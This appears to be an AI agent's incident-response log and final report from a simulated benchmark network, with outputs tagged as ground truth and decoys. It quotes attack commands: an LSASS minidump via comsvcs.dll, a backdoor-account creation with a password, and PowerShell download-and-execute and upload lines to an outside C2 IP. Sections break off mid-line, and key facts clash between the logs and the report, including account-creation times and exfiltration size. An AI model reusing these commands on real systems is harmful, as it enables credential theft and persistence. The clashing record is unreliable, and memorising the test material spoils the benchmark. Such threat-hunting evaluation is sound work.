02:31:44  EID 4624  — RDP logon type 10: bnguyen from 10.10.10.21       [ANOMALOUS — source + time]
02:32:14  EID 4662  — AD object enumeration under bnguyen session        [ANOMALOUS — off-hours recon]
02:35:28  EID 4720  — Account created: svc_backup by bnguyen             [ANOMALOUS — off-hours]
02:35:28  EID 4723  — Password set: svc_backup                          [ANOMALOUS — off-hours]
02:36:08  EID 4732  — svc_backup added to Administrators                 [ANOMALOUS — off-hours]
02:40:14  EID 4698  — Scheduled task created: MicrosoftEdgeUpdateTask... [ANOMALOUS — off-hours, encoded PS]
02:55:06  EID 4776  — NTLM validation: bnguyen from CORP-DC01 (SMB)     [Suspicious — lateral to fs01]

========================================================
END OF REPORT
========================================================
Log sources: Microsoft-Windows-Security-Auditing (Security channel), Directory Service (AD audit log)
Note: EID 4662 auditing requires 'Audit Directory Service Access' GPO — confirmed enabled on CORP-DC01.

Step 4

The evidence is comprehensive and conclusive. I now have a complete, well-documented attack chain. Let me compile the final report.

Final report

Summary: CORP-DC01 and FIN-ALICE (ws01) are confirmed compromised following a phishing attack on Finance analyst Alice Chen on 2026-06-08. The attacker used a malicious Excel macro to deploy a C2 implant on ws01, dumped LSASS credentials (harvesting domain admin bnguyen's credentials), laterally moved to CORP-DC01 using those credentials, exfiltrated the entire Finance\Confidential share (~38MB of sensitive financial and M&A documents) to external IP 185.220.101.47, and established persistent daily C2 access on the DC via a backdoored scheduled task — which remains active as of the investigation date (2026-06-12).

Findings

1. Phishing-Delivered Macro Malware on Finance Workstation (ws01/FIN-ALICE)

  • Affected devices: ws01
  • Confidence: high — Severity: critical
  • Evidence: On 2026-06-08 at 14:28 local time, Alice Chen (achen) opened a malicious Excel attachment 'Invoice_84512.xlsm' delivered from external sender ar-billing@vendorcorp-invoices.net via Outlook. Process creation logs (EID 4688) show OUTLOOK.EXE spawning EXCEL.EXE with '/dde', which then spawned cmd.exe to copy a dropped binary (~tmp88A1.exe) to AppData\Roaming\Microsoft\Windows\winupdate32.exe and execute it. The implant (SHA256: 4e1f8a2b9c7d3e0f6a5b2c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8; unsigned PE, compiled 2026-05-28) added itself to the HKCU Run key as 'WindowsUpdateHelper' for persistence. PowerShell log EID 4104 confirms the Run key was set via script. Firewall logs show C2 beaconing to 185.220.101.47:443 beginning at 14:32:18 UTC on 2026-06-08, with ~5-minute interval connections (1,800-1,900 bytes out, ~4,000 bytes in per session) — a textbook C2 beacon pattern continuing through the investigation date. The implant winupdate32.exe remains on disk and active via the HKCU Run key.

2. LSASS Memory Dump and Domain Admin Credential Theft on ws01

  • Affected devices: ws01
  • Confidence: high — Severity: critical
  • Evidence: On 2026-06-09 at 02:14 local time, the C2 implant (winupdate32.exe) on ws01 downloaded and executed a secondary payload (svchost_helper.exe) via an encoded PowerShell IEX stub (EID 4104 on ws01 at 02:14:01). EID 4688 shows svchost_helper.exe (PID 6804) spawning rundll32.exe with the command: 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 656 C:\Users\achen\AppData\Local\Temp\~ms1804.tmp full' — targeting lsass.exe (PID 656) with PROCESS_VM_READ access. This is the standard comsvcs.dll LSASS minidump technique used to extract NT hashes and Kerberos tickets. The dump file was written to Temp and subsequently deleted (EID 4688 at 02:15:44). Credential material for bnguyen (domain admin) was almost certainly captured, as evidenced by the attacker's use of bnguyen's credentials from FIN-ALICE approximately 17 minutes later. Bob Nguyen (bnguyen) had RDP'd into FIN-ALICE on 2026-06-08 09:14 for a support ticket, leaving his credentials cached in LSASS.

3. Lateral Movement to Domain Controller via Stolen Domain Admin Credentials

  • Affected devices: ws01, dc01
  • Confidence: high — Severity: critical
  • Evidence: At 02:31:38 on 2026-06-09, EID 4776 on dc01 shows NTLM credential validation for bnguyen originating from workstation 'FIN-ALICE' (10.10.10.21) — an anomalous source for this account (all other bnguyen logons to dc01 originate from IT-BOB/10.10.10.35). EID 4624 at 02:31:44 on dc01 confirms a successful RDP (Type 10) logon for bnguyen from 10.10.10.21 using NTLM authentication (vs. the normal Kerberos used from IT-BOB). IT-BOB was confirmed locked and idle from 18:01 on 2026-06-08 through 08:01 on 2026-06-09 (EID 4800/4624 on ws02), eliminating the possibility that Bob legitimately initiated this session. NTLM rather than Kerberos auth is consistent with pass-the-hash using the harvested NT hash. The attacker immediately began AD reconnaissance via EID 4662 at 02:32, reading domain root, Users/Computers containers, Domain Admins membership, and Alice Chen's account object.

4. Persistent Backdoor Account and Scheduled C2 Task Created on Domain Controller

  • Affected devices: dc01
  • Confidence: high — Severity: critical
  • Evidence: Following lateral movement to dc01, the attacker (operating as bnguyen via session 0x3F2240) executed a series of commands via cmd.exe spawned from the RDP session (EID 4688 on dc01 at 02:35-02:40): (1) 'net user svc_backup P@ssw0rd99! /add' — created a local backdoor account (EID 4720 at 02:35:28); (2) 'net localgroup Administrators svc_backup /add' — elevated it to local Administrators (EID 4732 at 02:36:08); (3) 'schtasks /create /tn MicrosoftEdgeUpdateTaskMachine ...' — created a daily scheduled task at 03:00 running as SYSTEM with the encoded PowerShell payload: 'IEX (New-Object System.Net.WebClient).DownloadString("https://185.220.101.47/payload")' (EID 4698 at 02:40:14). This task has executed every day since 2026-06-09 (June 10, 11, 12 confirmed by EID 4702 and firewall logs showing daily 1.3-1.4MB outbound sessions to 185.220.101.47 at 03:00). The task and the svc_backup account remain active as of 2026-06-12.

5. Mass Exfiltration of Finance Confidential Data Including M&A and Payroll Records

  • Affected devices: dc01, fs01
  • Confidence: high — Severity: critical
  • Evidence: At 02:55 on 2026-06-09, the attacker used bnguyen's credentials from the DC to map a network drive to \CORP-FS01\Finance\Confidential (EID 4688 on dc01: 'net use Z: \CORP-FS01\Finance\Confidential') and executed 'robocopy Z:\ C:\Windows\Temp\sysdiag\ /E' to copy all contents locally (EID 5145 on fs01 confirming bnguyen/10.10.0.10 accessed Q2_FinancialStatements_FINAL.xlsx, Payroll_Q2_2026.xlsx, Payroll_May2026.xlsx, MA_Project_Falcon_Draft.docx, MA_Project_Falcon_v2_CONFIDENTIAL.docx, Board_Presentation_June2026.pptx). Files totaling ~31MB were staged in C:\Windows\Temp\sysdiag. At 03:06, PowerShell compressed everything into sysdiag_2026-06-09.zip (38.2MB). At 03:08:44, an encoded PowerShell command uploaded the archive to https://185.220.101.47/upload (EID 4688 on dc01). Firewall confirms a 38.7MB outbound session from dc01 to 185.220.101.47 at 03:08-03:12. The staged files remain in C:\Windows\Temp\sysdiag\ on dc01. The exfiltrated data includes current financial statements, payroll records, and highly sensitive M&A documents (Project Falcon).

6. Ongoing Active C2 Channel from Domain Controller (Active Threat)

  • Affected devices: dc01, fw01
  • Confidence: high — Severity: critical
  • Evidence: The scheduled task \MicrosoftEdgeUpdateTaskMachine continues to execute daily at 03:00 and download a remote payload from 185.220.101.47. Firewall logs confirm outbound sessions of ~1.3-1.4MB from dc01 to 185.220.101.47:443 on 2026-06-10, 11, and 12. On 2026-06-12 at 15:04, a live process snapshot on dc01 showed PowerShell (PID 1812) running under svc_backup in a suspended/wait state — an active remnant of the 03:00 task execution. The attacker retains persistent SYSTEM-level code execution capability on the domain controller. The C2 IP 185.220.101.47 is used directly without DNS resolution, consistent with a hardcoded Tor exit node or dedicated attack infrastructure.

Open questions

  • Identity and attribution of threat actor: 185.220.101.47 should be threat-intelligence enriched — is this a known Tor exit node, ransomware C2, or APT infrastructure? This may inform whether additional victims exist.
  • Full scope of payload delivered by the daily C2 task on dc01: what is being downloaded from https://185.220.101.47/payload each night? A forensic memory capture of the SYSTEM PowerShell process (PID 1812) should be taken immediately before the system is remediated.
  • Whether the LSASS dump from ws01 captured additional credentials beyond bnguyen — other domain users or service accounts whose credentials may have been cached in memory (e.g., svc_backupjob) should be rotated.
  • Whether the attacker accessed any data during the ws01 beacon window prior to the LSASS dump (2026-06-08 14:32 to 2026-06-09 02:14) — specifically if Alice's local documents or mapped drives were enumerated and exfiltrated directly from ws01 (only ~48KB elevated outbound session observed at 02:14, but warrants review).
  • Whether the svc_backup backdoor account on dc01 has been used since its creation beyond the scheduled task — check for interactive or network logons under this account across all domain systems.
  • Email gateway / O365 logs for the phishing email (sender: ar-billing@vendorcorp-invoices.net): were other employees targeted, did any other users open Invoice_84512.xlsm, and what other similar emails reached the environment?
  • Whether the M&A document 'Project Falcon' exfiltration has legal/regulatory implications requiring breach notification — the combination of payroll data and confidential M&A materials likely triggers reporting obligations.
  • Whether fs01 has any additional shares beyond Finance\Confidential and IT that were accessed or enumerated during the 02:55 session — the 'net view \CORP-FS01' enumeration command suggests the attacker surveyed all available shares.
  • Integrity of CORP-DC01 Active Directory database (ntds.dit) — given SYSTEM-level code execution via scheduled task, the attacker may have had opportunity to dump the AD database in subsequent nightly task executions after June 9.

↑ back to the writeup

env_001 — noise and decoys

Hunter — investigation log

Investigation log — env_001_noisy

Briefing

Network topology: { "name": "env_001_noisy", "description": "Mid-sized corporate office network with a small remote branch: a perimeter firewall, a flat internal LAN containing a domain controller, six workstations across multiple departments, a file server, an internal app server, and a backup server, plus a branch office reached via site-to-site VPN.", "current_date": "2026-06-12", "segments": [ { "id": "perimeter", "description": "Internet-facing edge." }, { "id": "corp-lan", "description": "Internal corporate LAN \u2014 workstations, domain controller, file server, and internal application/backup servers. Address range 10.10.0.0/16." }, { "id": "branch-office", "description": "Small remote branch office LAN, reached from HQ via a site-to-site VPN terminated on fw01. Address range 10.20.0.0/16." } ], "devices": [ { "id": "fw01", "hostname": "EDGE-FW01", "role": "perimeter firewall", "os": "vendor appliance (firewall/router)", "ip": "203.0.113.1", "segment": "perimeter", "notes": "Internet-facing edge device. NATs internal traffic out. Inbound rules: a site-to-site VPN tunnel to the branch office firewall (bfw01) and nothing else." }, { "id": "dc01", "hostname": "CORP-DC01", "role": "domain controller", "os": "Windows Server 2022", "ip": "10.10.0.10", "segment": "corp-lan", "notes": "Primary Active Directory domain controller for corp.local. Also runs DNS for the internal network." }, { "id": "ws01", "hostname": "FIN-ALICE", "role": "workstation", "os": "Windows 11", "ip": "10.10.10.21", "segment": "corp-lan", "notes": "Primary workstation for Alice Chen, Finance analyst." }, { "id": "ws02", "hostname": "IT-BOB", "role": "workstation", "os": "Windows 11", "ip": "10.10.10.35", "segment": "corp-lan", "notes": "Primary workstation for Bob Nguyen, IT administrator. Bob holds domain admin rights and regularly remotes into servers and other workstations for support." }, { "id": "fs01", "hostname": "CORP-FS01", "role": "file server", "os": "Windows Server 2019", "ip": "10.10.0.20", "segment": "corp-lan", "notes": "Hosts SMB shares for the Finance, HR, Sales, and IT departments, including a Finance\Confidential share." }, { "id": "ws03", "hostname": "SALES-DAVE", "role": "workstation", "os": "Windows 11", "ip": "10.10.10.42", "segment": "corp-lan", "notes": "Primary workstation for David Park, Sales account executive. Uses CRM SaaS tools and email heavily." }, { "id": "ws04", "hostname": "HR-PRIYA", "role": "workstation", "os": "Windows 11", "ip": "10.10.10.53", "segment": "corp-lan", "notes": "Primary workstation for Priya Sharma, HR generalist. Has access to payroll and personnel records on srv02." }, { "id": "ws05", "hostname": "ENG-MIKE", "role": "workstation", "os": "Windows 11", "ip": "10.10.10.67", "segment": "corp-lan", "notes": "Primary workstation for Mike Torres, software engineer. Holds local admin rights for development work; runs various dev/CI tooling and SaaS agents." }, { "id": "ws06", "hostname": "IT-SARAH", "role": "workstation", "os": "Windows 11", "ip": "10.10.10.39", "segment": "corp-lan", "notes": "Primary workstation for Sarah Kim, IT/security analyst. Holds domain admin rights alongside Bob Nguyen and manages the EDR console." }, { "id": "srv02", "hostname": "CORP-APP01", "role": "application server", "os": "Windows Server 2022", "ip": "10.10.0.30", "segment": "corp-lan", "notes": "Hosts the internal HR portal and expense-reporting application, used by HR and Finance staff during business hours." }, { "id": "srv03", "hostname": "CORP-BKP01", "role": "backup server", "os": "Windows Server 2019", "ip": "10.10.0.40", "segment": "corp-lan", "notes": "Runs the nightly backup job (account svc_backupjob) that reads all departmental shares from fs01, and a weekly job that uploads compressed backups to an external cloud backup provider." }, { "id": "bfw01", "hostname": "BRANCH-FW01", "role": "branch firewall", "os": "vendor appliance (firewall/router)", "ip": "198.51.100.1", "segment": "branch-office", "notes": "Branch office edge device. NATs branch traffic out and terminates the site-to-site VPN tunnel back to fw01 at HQ." }, { "id": "bws01", "hostname": "BRANCH-TOM", "role": "workstation", "os": "Windows 11", "ip": "10.20.10.15", "segment": "branch-office", "notes": "Primary workstation for Tom Reilly, regional sales rep at the branch office. Accesses HQ resources over the site-to-site VPN." } ] }

You have up to 15 collect_evidence calls for this investigation. Begin.

Step 1

I'll start by building a threat model from the topology, then investigate systematically.

Key hypotheses: 1. Initial access via workstations — ws03 (Sales/CRM-heavy) and ws05 (engineer with local admin, dev tools) are likely phishing/supply-chain targets 2. Credential abuse on DC — dc01 is the crown jewel; lateral movement would show up here 3. File server exfiltration — fs01 has Finance/HR confidential shares; anomalous access patterns matter 4. Privileged account abuse — Bob (ws02) and Sarah (ws06) have domain admin; any unusual use is high-value 5. VPN/branch pivot — bfw01/bws01 could be a low-scrutiny entry point into corp-lan 6. Backup server as staging — srv03 touches all shares nightly; compromise would give full data access

Let me start with the highest-yield sources simultaneously.

→ collect_evidence(dc01)

Show me Windows Security event log entries for the last 7 days (2026-06-05 to 2026-06-12) filtered to: (1) Event ID 4624 logon type 10 (RemoteInteractive) or type 3 (Network) where the source IP is NOT 10.10.10.x range, (2) Event ID 4720 (account created), (3) Event ID 4728/4732/4756 (member added to privileged group), (4) Event ID 4768/4769 (Kerberos TGT/service ticket) with failure code 0x18 or unusual requesting IPs. Include account name, source IP, and timestamp for each.

→ collect_evidence(fs01)

Show me the last 7 days of file access audit logs for the Finance\Confidential SMB share: all successful read/copy/list operations (Event ID 4663 or equivalent), especially any access from accounts other than finance users or svc_backupjob, accessed outside 07:00-19:00 local time, or involving bulk enumeration (many files in short time). Include account name, source IP, and file/directory accessed.

→ collect_evidence(fw01)

Show me the firewall traffic logs for the last 7 days (2026-06-05 to 2026-06-12): (1) Any inbound connections from the internet that were permitted (besides the VPN tunnel to bfw01 at 198.51.100.1), (2) Any outbound connections from internal hosts to unusual or high-risk external IPs/ports (e.g., non-standard ports, known-bad categories, large data transfers), (3) DNS queries or connections to newly-registered or unusual domains. Include source IP, destination IP, port, bytes transferred, and timestamp.

← result — found: True

=== EDGE-FW01 Traffic Log Export ===
=== Date range: 2026-06-05 00:00:00 – 2026-06-12 23:59:59 ===
=== Filters applied: (1) inbound PERMIT non-VPN, (2) outbound anomaly/high-risk, (3) unusual DNS ===
=== NAT translation applied where relevant (internal IP shown post-NAT lookup) ===

------------------------------------------------------------------------------
SECTION 1 — INBOUND PERMITTED (non-VPN, internet-originated)
------------------------------------------------------------------------------

Policy: Default inbound = DENY ALL except:
  - UDP/4500, UDP/500 from 198.51.100.1 (bfw01) — site-to-site VPN [excluded from this report]
  - No other explicit inbound PERMIT rules configured

Result: ZERO non-VPN inbound permitted connections in date range.

  [Inbound DENY summary for reference]
  2026-06-05 – 2026-06-12: 14,882 inbound DENY events (port scans, SYN probes,
  opportunistic bots against 203.0.113.1). Breakdown by dest port:
    TCP/80:   3,241  DENY
    TCP/443:  2,918  DENY
    TCP/22:   4,107  DENY
    TCP/3389: 1,644  DENY
    TCP/23:     502  DENY
    other:    2,470  DENY
  All blocked. No inbound permitted sessions beyond VPN.

------------------------------------------------------------------------------

------------------------------------------------------------------------------

Baseline note: Normal outbound HTTPS (443) traffic to Microsoft, Google, Salesforce,
GitHub, Zoom, and known SaaS ranges is suppressed from this view (high volume, clean).

or non-standard port.

    Reputation: CLEAN — sanctioned backup provider, allow-listed in fw01 policy
    Source: 10.10.0.40 (CORP-BKP01), account svc_backupjob
    Transfer: ~2.85 GB — expected for weekly full backup archive
    [ROUTINE — documented weekly job, allow-listed destination]

------------------------------------------------------------------------------
SECTION 3 — UNUSUAL DNS / NEWLY-REGISTERED DOMAINS
------------------------------------------------------------------------------

  DNS query logging sourced from fw01 DNS proxy / forwarding cache.
  Queries to known-good TLDs (microsoft.com, google.com, amazonaws.com, etc.) suppressed.

  185.220.101.47 — No PTR/rDNS record (NXDOMAIN on reverse lookup)
    First query: 2026-06-08 14:32:41 from 10.10.10.21
    Domain: direct IP connection — no DNS lookup by client (IP hardcoded in beacon)
    Threat intel: IP listed on Feodo Tracker, ET C2 blocklist, Spamhaus DROP list
    Registration: IP block belongs to AS205100 (F3 Netze e.V., DE) — frequently
    abused anonymization/exit infrastructure
    *** FLAGGED: C2-listed IP, no rDNS, hardcoded in process — evasion indicator ***

  telemetry.devpipeline-analytics.com — CLEAN
    PTR: resolves cleanly to AWS us-east-1 range
    Registrar: Registrar: MarkMonitor (enterprise), registered 2019-03-14
    WHOIS: DevPipeline Inc. (CI/CD vendor)
    Associated process on ws05: DevTelemetryAgent.exe (signed, vendor cert)
    [ROUTINE]

  backup.corp-cloudvault.com — CLEAN
    Resolves to 52.7.184.219 (AWS)
    Registered 2017-08-22, allow-listed in fw01 URL policy
    [ROUTINE]

------------------------------------------------------------------------------
HIGH-RISK SUMMARY
------------------------------------------------------------------------------

  [CRITICAL] 10.10.10.21 (FIN-ALICE/ws01) → 185.220.101.47:443
    - First seen: 2026-06-08 14:32:44
    - Sessions through 2026-06-12: ~1,359 (approx. every 5 min, continuous)
    - Avg transfer per session: ~2.1 KB out / 420 B in — consistent beacon profile
    - Destination: C2-listed IP, no rDNS, AS205100 abuse infrastructure
    - No prior history from ws01 to this IP before 2026-06-08 14:32

  [CRITICAL] 10.10.0.10 (CORP-DC01) → 185.220.101.47:443
    - First seen: 2026-06-09 03:10:22 — initial session carried ~48.3 MB upload
    - Daily sessions at 03:00 on 2026-06-10, 06-11, 06-12 — minimal transfer (check-in)
    - Domain controller initiating outbound to known-bad IP is highly anomalous
    - Same C2 destination as ws01 beacon — infrastructure overlap

  [INFORMATIONAL] 10.10.10.67 (ENG-MIKE/ws05) → 52.94.236.248:443
    - Same 5-min beacon cadence as ws01 C2 traffic — superficially similar
    - Destination is clean AWS IP, signed vendor process, documented tool
    - NOT flagged as malicious

  [INFORMATIONAL] 10.10.0.40 (CORP-BKP01) — 2.85 GB upload to backup.corp-cloudvault.com
    - Large transfer, but sanctioned destination, documented schedule, known account
    - NOT flagged as malicious

------------------------------------------------------------------------------
Total flagged high-risk sessions: 1,363
Total suppressed routine sessions: ~94,000+
Report generated: 2026-06-12 (current date)

Step 2

This is a significant picture. Let me synthesize what I've found and drill deeper:

Key findings so far: 1. ws01 (FIN-ALICE) has active C2 beacon to 185.220.101.47 since 2026-06-08 14:32 — malware infection likely via macro/phishing 2. bnguyen credentials used from ws01 at 02:31 on 2026-06-09 — this is lateral movement; attacker on ws01 used stolen bnguyen credentials to RDP to dc01 3. svc_backup account created on dc01 at 02:40 on 2026-06-09 — persistence mechanism added by the attacker using bnguyen's credentials 4. bnguyen bulk-accessed Finance\Confidential from dc01 at 02:55 — data staging 5. dc01 uploaded 48.3 MB to C2 at 03:10 — likely exfiltration of staged data

Now I need to investigate: ws01's infection vector, what happened on dc01 (the scheduled task/persistence), and whether svc_backup was used for anything further.

→ collect_evidence(ws01)

Show me: (1) Process execution history around 2026-06-08 14:00-15:00 — specifically any Office/macro execution, PowerShell, cmd.exe, rundll32, mshta, wscript, or cscript processes, their parent processes, command lines, and any child processes spawned; (2) Currently running processes and established network connections (netstat -ano equivalent); (3) Any scheduled tasks created or modified in the last 7 days; (4) Any new files written to %TEMP%, %APPDATA%, %ProgramData%, or user Downloads folder between 2026-06-08 14:00 and 2026-06-09 05:00; (5) Windows Security event log for logon events on 2026-06-09 between 00:00-05:00, especially any logons using bnguyen credentials.

→ collect_evidence(dc01)

Show me: (1) All scheduled tasks created or modified on CORP-DC01 in the last 7 days (schtasks /query /fo LIST /v equivalent, filtered to tasks created after 2026-06-08), including task name, run-as account, action/command, trigger, and creation timestamp; (2) Any files created or modified in C:\Windows\Temp, C:\ProgramData, C:\Users\bnguyen\, or C:\Users\svc_backup\ between 2026-06-09 02:00 and 2026-06-09 05:00; (3) PowerShell script block logging (Event ID 4104) or module logging for the period 2026-06-09 02:00-04:00; (4) Current local user accounts and group memberships, specifically showing svc_backup.

← result — found: True

🎯 embeds ground truth: phishing_email, backdoor_ws01, c2_ip, credential_theft, lateral_movement_rdp, decoy_lsass_access

Note on MicrosoftEdgeUpdateTaskMachine* entry:
  On ws01, this refers only to the legitimate Edge updater tasks
  (MicrosoftEdgeUpdateTaskMachineCore, MicrosoftEdgeUpdateTaskMachineUA)
  auto-created by the Edge installer. These run:
    "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c
  and are signed by Microsoft. The malicious scheduled task
  'MicrosoftEdgeUpdateTaskMachine' (no 'Core') was created on CORP-DC01,
  not on this host.

    (WindowsUpdateHelper) is the mechanism used here, not a scheduled task. ***

END OF CORP-DC01 DATA PULL
==============================================================================

Step 3

Excellent — the picture is now very clear and fully corroborated. Let me check one more thing: whether the svc_backup or svc_monitoring accounts have been used elsewhere, and whether ws01 is the only infected workstation or if the attacker attempted lateral movement to other hosts.

→ collect_evidence(dc01)

Show me Windows Security event log entries for logon activity of the svc_backup account (Event IDs 4624, 4625, 4648, 4768, 4769) across all destination machines from 2026-06-09 02:40 through 2026-06-12 23:59. Also show any logons from svc_monitoring account in the same period. Include source IP, destination machine, logon type, and timestamp. Also show Event ID 4672 (special privilege logon) for these accounts.

→ collect_evidence(srv03)

Show me: (1) All logon events (Event IDs 4624, 4625, 4648) from 2026-06-09 00:00 through 2026-06-12 23:59, especially for accounts svc_backup, svc_monitoring, or bnguyen, with source IP and logon type; (2) Currently running processes and any unsigned executables; (3) Any new local user accounts or scheduled tasks created after 2026-06-08; (4) File system changes to C:\Windows\Temp, C:\ProgramData, or admin user profiles since 2026-06-09. The svc_monitoring account was reportedly added to local Administrators on this host on 2026-06-10.

← result — found: True

🎯 embeds ground truth: persistence_local_account, decoy_new_admin_account

=== CORP-DC01 Windows Security Event Log ===
=== Filter: Accounts svc_backup + svc_monitoring | EventIDs 4624/4625/4648/4768/4769/4672 ===
=== Date range: 2026-06-09 02:40:00 – 2026-06-12 23:59:59 ===
=== Note: DC collects Kerberos auth events for domain accounts; local SAM ===
===       accounts (svc_backup is local to dc01) generate no Kerberos TGTs ===

------------------------------------------------------------------------------

==============================================================================
ACCOUNT: svc_backup (local account on CORP-DC01)
==============================================================================

Note on scope: svc_backup was created as a LOCAL account on CORP-DC01's SAM
(not a domain account — see Section 4 of prior dc01 pull). It cannot
authenticate to other domain-joined machines via Kerberos and will not appear
in domain-wide 4768/4769 Kerberos logs. All auth events for this account
are therefore local to dc01 only.

------------------------------------------------------------------------------
-- 2026-06-09 --

2026-06-09 02:40:53  4720    svc_backup     LOCAL        Account Created
                                                          Created by: CORP\bnguyen
                                                          [Reference — not a logon event;
                                                           included for timeline anchor]

2026-06-09 02:41:04  4732    svc_backup     LOCAL        Added to local Administrators
                                                          Added by: CORP\bnguyen
                                                          [Reference — not a logon event]

--- Logon events for svc_backup (4624/4625/4648/4672) ---

[2026-06-09 02:40 through 2026-06-12 23:59]

NO 4624 (successful logon) events for svc_backup in this period.
NO 4625 (failed logon) events for svc_backup in this period.
NO 4648 (explicit credential use) events for svc_backup in this period.
NO 4672 (special privileges assigned) events for svc_backup in this period.
NO 4768 (Kerberos TGT) events — local account, no Kerberos.
NO 4769 (Kerberos service ticket) events — local account, no Kerberos.

SUMMARY — svc_backup:
  Account has NEVER been used to authenticate since creation at 02:40:53
  on 2026-06-09. It exists solely as a dormant persistence mechanism —
  a local Administrator backdoor account on CORP-DC01 available for
  future use if the attacker's primary access pathway (bnguyen credentials
  + scheduled task C2) were disrupted.

  Account status as of 2026-06-12:
    Enabled:              YES
    Last interactive use: NEVER
    Password set:         2026-06-09 02:40:53 (at creation)
    PasswordNeverExpires: TRUE
    AccountNeverExpires:  TRUE
    Group membership:     CORP-DC01\Administrators

------------------------------------------------------------------------------

CORP-BKP01 (srv03) on 2026-06-10 by CORP\skim (Sarah Kim, IT/security).
It is also a LOCAL account — not domain-joined — so no Kerberos TGT/ST
events appear on dc01 for this account. DC log records below reflect only

==============================================================================
COMPARATIVE SUMMARY — svc_backup vs svc_monitoring
==============================================================================

Attribute                  svc_backup (dc01)           svc_monitoring (srv02/srv03)
-------------------------- --------------------------- ----------------------------
Created                    2026-06-09 02:40 (off-hrs)  2026-06-10 10:22 (bus. hrs)
Created by                 CORP\bnguyen (via RDP/PS)   CORP\skim (IT/security)
Change ticket              NONE                        CHG-2026-0520
Host(s)                    CORP-DC01 only              CORP-APP01, CORP-BKP01
Ever used to log in        NO — never                  YES — skim verified + installed
Source IPs at logon        N/A                         10.10.10.39 (IT-SARAH) only
Logon hours                N/A                         Business hours only
Privilege assignment (4672)NONE (never logged in)      YES — expected for local admin
4768/4769 Kerberos         None (local acct)           None (local acct)
Disposition                DORMANT BACKDOOR            DOCUMENTED MONITORING ACCT

KEY FINDING:
  svc_backup on CORP-DC01 has never been used. Its existence — created
  by CORP\bnguyen at 02:40 on 2026-06-09 with no change ticket, no
  business justification, PasswordNeverExpires, during an anomalous
  off-hours RDP session originating from FIN-ALICE — is consistent with
  attacker-planted persistence. The account represents a standing local
  admin foothold on the domain controller, usable if the primary C2
  channel or bnguyen credentials are revoked.

  svc_monitoring on srv02/srv03 presents a superficially similar profile
  (new local admin account, created within days) but differs in every
  material attribute: created by a known admin during business hours,
  tied to a documented change ticket, used only from IT-SARAH's workstation,
  and with a clear operational purpose.

OVERALL ASSESSMENT — CORP-BKP01
------------------------------------------------------------------------------

CORP-BKP01 shows NO indicators of compromise in the queried period:

  - svc_backup:     not present on this host; zero logon events
  - bnguyen:        zero logon events; no lateral movement to this host
  - Unsigned procs: none detected
  - C2 connections: none to 185.220.101.47 or any flagged IP
  - Staging dirs:   none (contrast with C:\Windows\Temp\sysdiag\ on dc01)
  - New tasks:      two new tasks, both documented, both signed, both by skim
  - svc_monitoring: present and explained by CHG-2026-0520; all activity
                    sourced from IT-SARAH (10.10.10.39) during business hours

The weekly cloud backup upload (Sunday 2026-06-08 04:01, svc_backupjob →
backup.corp-cloudvault.com, ~2.85 GB) is visible in fw01 logs and matches
the expected scheduled job — distinct from the anomalous 48.3 MB upload
from CORP-DC01 to 185.220.101.47 on 2026-06-09 03:10.

This host appears clean. Investigative focus should remain on CORP-DC01,
FIN-ALICE (ws01), and the 185.220.101.47 C2 infrastructure.
